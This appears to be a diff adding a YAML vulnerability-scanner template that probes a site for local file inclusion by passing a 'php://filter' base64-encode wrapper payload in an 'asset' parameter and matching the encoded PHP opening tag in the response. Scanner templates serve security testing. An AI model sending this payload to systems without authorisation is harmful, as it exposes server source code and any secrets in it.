@@ -1,0 +1,20 @@
+id: lfi5-050
+name: 'Wrapper php via asset'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via php wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      asset:
+        - 'php://filter/convert.base64-encode/resource=admin'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
